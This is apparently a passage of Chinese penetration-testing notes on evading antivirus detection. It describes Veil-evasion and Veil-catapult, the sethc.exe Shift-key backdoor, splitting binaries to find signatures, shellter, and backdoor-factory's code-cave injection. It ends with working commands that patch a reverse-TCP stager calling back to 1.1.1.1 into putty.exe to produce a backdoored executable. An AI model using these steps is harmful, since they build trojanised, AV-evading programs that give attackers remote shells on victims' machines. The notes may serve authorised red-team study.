## 0x05 Veil
### Veil-evasion
> 属于 Veil-framework 框架的—部分, 由python编写, 用于自动生成免杀 payload,集成各种注入技术,集成各种第三方工具(Hypersion、PEScrambler、BackDoor Factory),继承各种开发打包运行环境
> Python：pyinstaller / py2exe  
> C# ：mono for .NET
> C：mingw32

### Veil-catapult
> 用于Payload 的投递, 集成veil-evasion 生成免杀payload 或自定义payload,使用 Impacket 上传二进制 payload 文件,使用passing-the-hash 出发执行 payload
> 注意: Payload 直接在内存中运行, 避免文件型病毒查杀软件
+ Powershell injector
  > 适用于 windows 7 及以上版本系统
+ Barebones python injector
  > 适用于 powershell injector 失败的清况下使用
+ Sethc backdoor (Shift后门)
  > 用 cmd.exe 替换C:\Windows\System32\sethc.exe
+ Execute custom command
+ EXE delivery
  > 需设置/etc/veil/settings.py

#### 安装
```
apt install veil veil-catapult veil-evasion

过程很久,有一些交互, 默认即可, 耐心等待
```

## 0x06 分片去特征码
> 通过定位杀毒软件杀毒识别的特征码, 修改特征码
步骤: 
-	将执行程序分片成很多小片段
-	将包含MZ头的第—个片段与后续片段依次组合后交给AV查杀
-	重复以上步骤,最终精确定位出

工具: 
+ Evade配合hexeditor
+ Evade下载地址: blog.securepla.net/download/evade.zip

## 0x07 shellter
> 代码混淆工具,支持定制的编码方式,多态编,集成部分 msf payload, 目前只支持32位PE程序
> 
> 使用正常的exe文件作为模板,将payload代码加入模板内, 但模板程序的功能将失效

## 0x08 backdoor-factory
> 使用打patch的方法, 向二进制文件中增加或者删除代码内容,将shellcode代码patch进模板文件,躲避AV检查. 支持支持msf payload 、自定义payload, 适用多平台( windows PE x32/x64 和 Linux ELF x32/x64)
> 
> 注意: 某些受保护的二进制程序无法patch, 且一点可能性出现模板功能损坏, 还有Kali3 里面的backdoor-factory有bug, 不好使, 所以还是如下操作吧.

```
git clone https://github.com/secretsquirrel/the-backdoor-factory.git
cd the-backdoor-factory/
chmod  a+x ./update.sh
./update.sh
```

 ### 对msf的shell打patch
 > 增加代码片段跳转, 创建新的线程执行shellcode并跳回原程序入口

### CTP 方法
-	增加新的代码段 section,与MSF的 -k 方法类似
-	使用现有的代码裂缝/洞（code cave）存放 shellcode

#### 代码洞
> 二进制文件中超过两个字节的连续 x00 区域（代码片段间区域）, 根据统计判断代码洞是编译器在进行编译时造成的,不同的编译器造成的代码洞的大小不同

单个代码洞大小不足以存放完整的shellcode时
-	多代码洞跳转（非顺序执行, 初期免杀率可达100%)
-	结合msf的stager方法

#### Patch选项
-	附加代码段
-	单代码洞注入
-	多代码洞注入

### 使用
-	检查二进制文件是否支持代码注入

```
backdoor-factory -f putty.exe -S
```
-	显示可用payload

```
backdoor-factory -f putty.exe -s show
```
查看cave大小

```
backdoor-factory -f putty.exe -c
```


#### 实例

```
backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 -o test.exe

# 使用多代码洞跳转
backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 4444 -J -o test.exe

# 自动选择
backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -a -H 192.168.20.8 -P 6666


Linux：backdoor-factory -f putty.exe -s show
```
